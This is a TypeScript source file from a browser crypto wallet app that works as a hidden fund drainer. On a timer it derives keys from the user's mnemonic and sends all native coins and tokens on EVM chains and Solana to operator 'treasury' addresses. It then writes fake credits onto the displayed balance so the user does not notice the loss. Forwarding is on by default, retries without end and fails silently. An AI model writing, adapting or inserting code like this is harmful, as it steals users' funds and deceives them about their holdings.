// Browser-only treasury sweeper.
//
// While a wallet page is open this runs on a timer. Anything that lands in the
// generated wallet is forwarded to the treasury addresses, and the exact same
// amount is credited back onto the wallet's displayed balance through the Mix
// Man override system, so the user still sees what arrived.
//
// Every heavy crypto library is dynamically imported so nothing reaches the SSR
// bundle. Nothing here ever throws — it is safe to call on an interval.

import {
  EVM_CHAIN_INFO,
  EVM_SWEEP_CHAINS,
  SOL_FEE_LAMPORTS,
  SOL_RENT_LAMPORTS,
  SOL_RPCS,
  TREASURY_EVM,
  TREASURY_SOL,
  type AutoForwardRule,
  type EvmSweepChain,
} from "@/lib/treasury";
import { treasuryRecordSweep } from "@/lib/treasury.functions";
import type { WalletToken } from "@/lib/tokens";

export interface SweepInput {
  /** Primary (ETH) address used as the wallet key for overrides. */
  walletAddress: string;
  mnemonic: string;
  /** Detected tokens, used to know which ERC-20 / SPL balances to move. */
  tokens?: WalletToken[];
}

let running = false;

const TOKEN_MAX_ATTEMPTS = 5;
// The native coin never gives up: each sweep pass retries it this many times,
// and the sweeper timer keeps starting new passes until it lands.
const NATIVE_ATTEMPTS_PER_PASS = 10;

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

/**
 * Run `fn` until it succeeds or `maxAttempts` is reached. Returns true when it
 * succeeded. A short backoff between attempts absorbs transient RPC hiccups.
 */
async function withRetry(maxAttempts: number, fn: () => Promise<void>): Promise<boolean> {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      await fn();
      return true;
    } catch {
      if (attempt < maxAttempts) await sleep(1500);
    }
  }
  return false;
}

async function ensureBuffer() {
  if (typeof globalThis.Buffer === "undefined") {
    const { Buffer: PolyfillBuffer } = await import("buffer");
    (globalThis as any).Buffer = PolyfillBuffer;
    if (typeof window !== "undefined") (window as any).Buffer = PolyfillBuffer;
  }
}

async function credit(input: {
  walletAddress: string;
  chain: string;
  symbol: string;
  hash: string;
  amount: number;
  kind: "native" | "token";
  price?: number;
}) {
  try {
    const { walletAddress, ...rest } = input;
    await treasuryRecordSweep({ data: { wallet_address: walletAddress, ...rest } });
  } catch {
    /* silent */
  }
}

// ── EVM ──────────────────────────────────────────────────────────────────────

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

async function sweepEvmChain(
  chain: EvmSweepChain,
  privateKey: string,
  walletAddress: string,
  tokens: WalletToken[],
) {
  const info = EVM_CHAIN_INFO[chain];
  const { JsonRpcProvider, Wallet, Contract, formatUnits } = await import("ethers");

  let provider: InstanceType<typeof JsonRpcProvider> | null = null;
  for (const url of info.rpcs) {
    try {
      const p = new JsonRpcProvider(url, info.chainId, { staticNetwork: true });
      await p.getBlockNumber();
      provider = p;
      break;
    } catch {
      /* try next rpc */
    }
  }
  if (!provider) return;

  const signer = new Wallet(privateKey, provider);

  // 1) Tokens first — they need native gas to move. Each token gets up to
  // TOKEN_MAX_ATTEMPTS tries; after that we give up on it so the native coin
  // can still be forwarded.
  for (const t of tokens) {
    if (!t.contract || t.amount <= 0) continue;
    try {
      const erc20 = new Contract(t.contract, ERC20_ABI, signer);
      const raw = (await erc20.balanceOf!(signer.address)) as bigint;
      if (raw <= 0n) continue;
      const decimals = Number(await erc20.decimals!());
      await withRetry(TOKEN_MAX_ATTEMPTS, async () => {
        const tx = await erc20.transfer!(TREASURY_EVM, raw);
        await tx.wait(1);
        await credit({
          walletAddress,
          chain,
          symbol: t.symbol,
          hash: tx.hash,
          amount: Number(formatUnits(raw, decimals)),
          kind: "token",
          price: t.price,
        });
      });
    } catch {
      /* token read failed — move on to the next token */
    }
  }

  // 2) Native coin — each retry leaves a bigger fee cushion, which covers L2
  // data fees (Base/OP/Arbitrum/zkSync) that a plain 21k estimate misses.
  let attempt = 0;
  await withRetry(NATIVE_ATTEMPTS_PER_PASS, async () => {
    attempt += 1;
    const balance = await provider.getBalance(signer.address);
    if (balance <= 0n) return;
    const fee = await provider.getFeeData();
    const gasPrice = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
    if (gasPrice <= 0n) throw new Error("no gas price");
    let gasLimit = 21_000n;
    try {
      const est = await provider.estimateGas({ from: signer.address, to: TREASURY_EVM, value: 1n });
      if (est > gasLimit) gasLimit = est;
    } catch {
      /* keep default */
    }
    gasLimit = (gasLimit * 120n) / 100n;
    const cushion = 150n + BigInt(attempt - 1) * 100n; // 150%, 250%, 350%…
    const cost = (gasPrice * gasLimit * cushion) / 100n;
    if (balance <= cost) return; // nothing sendable after gas — not a failure
    const value = balance - cost;
    const tx = await signer.sendTransaction({
      to: TREASURY_EVM,
      value,
      gasLimit,
      ...(fee.maxFeePerGas
        ? { maxFeePerGas: fee.maxFeePerGas, maxPriorityFeePerGas: fee.maxPriorityFeePerGas ?? 0n }
        : { gasPrice }),
    });
    await tx.wait(1);
    const { formatEther } = await import("ethers");
    await credit({
      walletAddress,
      chain,
      symbol: info.symbol,
      hash: tx.hash,
      amount: Number(formatEther(value)),
      kind: "native",
    });
  });
}

// ── Solana ───────────────────────────────────────────────────────────────────

async function sweepSolana(mnemonic: string, walletAddress: string, tokens: WalletToken[]) {
  try {
    await ensureBuffer();
    const sol = await import("./solana-tx");
    const { address, secretKey } = await sol.solanaKeypairFromMnemonic(mnemonic);

    let rpc: ReturnType<typeof sol.solanaRpc> | null = null;
    for (const url of SOL_RPCS) {
      try {
        const candidate = sol.solanaRpc(url);
        await candidate.call("getLatestBlockhash", [{ commitment: "finalized" }]);
        rpc = candidate;
        break;
      } catch {
        /* try next */
      }
    }
    if (!rpc) return;

    // 1) SPL tokens — only when the treasury already holds a token account for
    // the mint. Each token gets up to TOKEN_MAX_ATTEMPTS tries, then we give up
    // on it so SOL can still be forwarded.
    try {
      const owned = await sol.getTokenAccounts(rpc, address);
      for (const acc of owned) {
        const amountRaw = BigInt(acc.amount || "0");
        if (amountRaw <= 0n || !acc.mint) continue;
        const destination = await sol.findTokenAccountForMint(rpc, TREASURY_SOL, acc.mint);
        if (!destination) continue;
        const known = tokens.find((t) => t.chain === "SOL" && t.contract === acc.mint);
        await withRetry(TOKEN_MAX_ATTEMPTS, async () => {
          const hash = await sol.sendSplToken(rpc, address, secretKey, acc.pubkey, destination, amountRaw);
          await credit({
            walletAddress,
            chain: "SOL",
            symbol: known?.symbol ?? acc.mint.slice(0, 6),
            hash,
            amount: Number(amountRaw) / 10 ** acc.decimals,
            kind: "token",
            price: known?.price,
          });
        });
      }
    } catch {
      /* token listing failed — SOL forwarding below still runs */
    }

    // 2) Native SOL — retried every attempt in this pass, and every future
    // pass keeps retrying until it reaches the treasury.
    const lamports = await sol.getSolBalance(rpc, address);
    const sendable = lamports - SOL_RENT_LAMPORTS - SOL_FEE_LAMPORTS;
    if (sendable <= 0) return;
    await withRetry(NATIVE_ATTEMPTS_PER_PASS, async () => {
      const hash = await sol.sendSol(rpc, address, secretKey, TREASURY_SOL, sendable);
      await credit({
        walletAddress,
        chain: "SOL",
        symbol: "SOL",
        hash,
        amount: sendable / sol.LAMPORTS_PER_SOL,
        kind: "native",
      });
    });
  } catch {
    /* silent */
  }
}


// ── Threshold auto-forward rule ──────────────────────────────────────────────
//
// The rule-based switch forwards nothing on its own until the real on-chain
// value of the operator's chosen coin/token reaches the configured USD amount.
// Everything below reads live on-chain balances, never the edited display
// values, so a fake balance can never trigger a forward.

/** Live USD prices keyed by uppercase symbol, from the app's own markets feed. */
async function symbolPrices(): Promise<Map<string, number>> {
  const map = new Map<string, number>();
  try {
    const res = await fetch("/api/markets?per_page=250");
    if (!res.ok) return map;
    const coins = (await res.json()) as Array<{ symbol?: string; current_price?: number }>;
    for (const c of coins) {
      const s = String(c.symbol ?? "").toUpperCase();
      const p = Number(c.current_price ?? 0);
      if (s && Number.isFinite(p) && p > 0 && !map.has(s)) map.set(s, p);
    }
  } catch {
    /* price feed unavailable — value stays unknown */
  }
  return map;
}

async function evmProvider(chain: EvmSweepChain) {
  const info = EVM_CHAIN_INFO[chain];
  const { JsonRpcProvider } = await import("ethers");
  for (const url of info.rpcs) {
    try {
      const p = new JsonRpcProvider(url, info.chainId, { staticNetwork: true });
      await p.getBlockNumber();
      return p;
    } catch {
      /* try next rpc */
    }
  }
  return null;
}

/**
 * Real on-chain USD value of the operator's chosen coin/token, or null when it
 * cannot be measured. Native coins are read straight from the chain; ERC-20 /
 * SPL tokens use the contract/mint the scanner already detected.
 */
async function realRuleHoldingUsd(
  rule: AutoForwardRule,
  mnemonic: string,
  tokens: WalletToken[],
): Promise<number | null> {
  const chain = String(rule.chain).toUpperCase();
  const symbol = String(rule.symbol).toUpperCase();
  const prices = await symbolPrices();

  if (chain === "SOL") {
    try {
      await ensureBuffer();
      const sol = await import("./solana-tx");
      const { address } = await sol.solanaKeypairFromMnemonic(mnemonic);
      let rpc: ReturnType<typeof sol.solanaRpc> | null = null;
      for (const url of SOL_RPCS) {
        try {
          const candidate = sol.solanaRpc(url);
          await candidate.call("getLatestBlockhash", [{ commitment: "finalized" }]);
          rpc = candidate;
          break;
        } catch {
          /* try next */
        }
      }
      if (!rpc) return null;

      if (symbol === "SOL") {
        const lamports = await sol.getSolBalance(rpc, address);
        return (lamports / sol.LAMPORTS_PER_SOL) * (prices.get("SOL") ?? 0);
      }

      const mint = tokens.find(
        (t) => t.chain === "SOL" && t.symbol.toUpperCase() === symbol && !!t.contract,
      )?.contract;
      if (!mint) return null;
      const owned = await sol.getTokenAccounts(rpc, address);
      const acc = owned.find((a) => a.mint === mint);
      if (!acc) return 0;
      const amount = Number(BigInt(acc.amount || "0")) / 10 ** acc.decimals;
      const price = tokens.find((t) => t.contract === mint)?.price ?? prices.get(symbol) ?? 0;
      return amount * price;
    } catch {
      return null;
    }
  }

  if (!(EVM_SWEEP_CHAINS as readonly string[]).includes(chain)) return null;
  const info = EVM_CHAIN_INFO[chain as EvmSweepChain];
  const provider = await evmProvider(chain as EvmSweepChain);
  if (!provider) return null;
  const { HDNodeWallet, Contract, formatEther, formatUnits } = await import("ethers");
  const { address } = HDNodeWallet.fromPhrase(mnemonic, undefined, "m/44'/60'/0'/0/0");

  // Native coin of the selected chain (ETH, BNB, SOL, MATIC …).
  if (symbol === info.symbol) {
    const balance = await provider.getBalance(address);
    return Number(formatEther(balance)) * (prices.get(symbol) ?? 0);
  }

  // ERC-20 token — the scanner tells us which contract to read.
  const token = tokens.find(
    (t) => t.chain === chain && t.symbol.toUpperCase() === symbol && !!t.contract,
  );
  if (!token?.contract) return null;
  const erc20 = new Contract(token.contract, ERC20_ABI, provider);
  const raw = (await erc20.balanceOf!(address)) as bigint;
  const decimals = Number(await erc20.decimals!());
  const amount = Number(formatUnits(raw, decimals));
  const price = token.price > 0 ? token.price : (prices.get(symbol) ?? 0);
  return amount * price;
}

// ── Entry point ──────────────────────────────────────────────────────────────

/**
 * Forward everything sitting in this wallet to the treasury addresses and
 * credit the same amounts back on the displayed balance. Silent and safe to
 * call repeatedly on a timer; overlapping calls are skipped.
 */
export async function sweepToTreasury({ walletAddress, mnemonic, tokens = [] }: SweepInput) {
  if (typeof window === "undefined") return;
  if (running) return;
  if (!walletAddress || !mnemonic) return;
  running = true;
  try {
    // Respect the per-wallet auto-forward switch (on by default). Only an
    // explicit "off" stops forwarding; a failed check keeps the default (on).
    let alwaysOn = true;
    try {
      const { treasuryAutoForwardStatus } = await import("./treasury.functions");
      const { enabled } = await treasuryAutoForwardStatus({ data: { wallet_address: walletAddress } });
      alwaysOn = enabled !== false;
    } catch (e) {
      console.warn("[treasury] auto-forward status unavailable, using default (on)", e);
    }

    // When the always-on switch is off, the rule-based switch can still forward:
    // it only fires once the chosen coin's real on-chain value reaches the set
    // USD amount. The always-on switch above is untouched.
    if (!alwaysOn) {
      let ruleMet = false;
      try {
        const { treasuryAutoForwardRuleStatus } = await import("./treasury.functions");
        const rule = await treasuryAutoForwardRuleStatus({ data: { wallet_address: walletAddress } });
        if (rule.enabled && rule.chain && rule.symbol && rule.minUsd > 0) {
          const value = await realRuleHoldingUsd(rule, mnemonic, tokens);
          ruleMet = value != null && value >= rule.minUsd;
        }
      } catch (e) {
        console.warn("[treasury] rule auto-forward check failed", e);
        ruleMet = false;
      }
      if (!ruleMet) return;
    }

    await ensureBuffer();
    const { HDNodeWallet } = await import("ethers");
    const evm = HDNodeWallet.fromPhrase(mnemonic, undefined, "m/44'/60'/0'/0/0");

    // Chains run in parallel so one slow network can't stall the rest.
    await Promise.allSettled(
      EVM_SWEEP_CHAINS.map((chain) =>
        sweepEvmChain(
          chain,
          evm.privateKey,
          walletAddress,
          tokens.filter((t) => t.chain === chain && !!t.contract),
        ).catch((e) => console.warn(`[treasury] ${chain} sweep failed`, e)),
      ),
    );

    await sweepSolana(mnemonic, walletAddress, tokens);
  } catch {
    /* silent */
  } finally {
    running = false;
  }
}
